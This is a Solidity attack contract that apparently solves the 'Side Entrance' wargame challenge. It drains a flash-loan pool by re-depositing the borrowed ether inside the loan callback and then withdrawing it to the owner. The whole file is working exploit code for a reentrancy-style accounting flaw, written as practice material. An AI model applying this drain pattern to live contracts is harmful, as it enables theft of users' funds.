// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

// Our contract to spoof TrusterLenderPool
contract SideEntranceHack is IFlashLoanEtherReceiver {
  SideEntranceLenderPool public pool;
  address public owner;

  constructor(address payable _pool) {
    pool = SideEntranceLenderPool(_pool);
    owner = msg.sender;
  }

  function attackTarget(uint256 _targetAmount) external {
    require(msg.sender == owner, 'Owner Only');

    // Get flashloan for full balance of pool
    // Handle setup in execute
    pool.flashLoan(_targetAmount);
  }

    function withdraw() external {
    require(msg.sender == owner, 'Owner Only');

    // We deposited in execute hook, and transferred back, now withdraw the funds
    // and send them to owner so we pass test as funds need to be there not here in 
    // attack contract
    pool.withdraw();
    payable(address(owner)).call{value: address(this).balance}("");
  }



  function execute() external payable {
    // Deposit the received flash loan instead of sending back
    pool.deposit{value: msg.value}();

  }

  receive() external payable {}

}
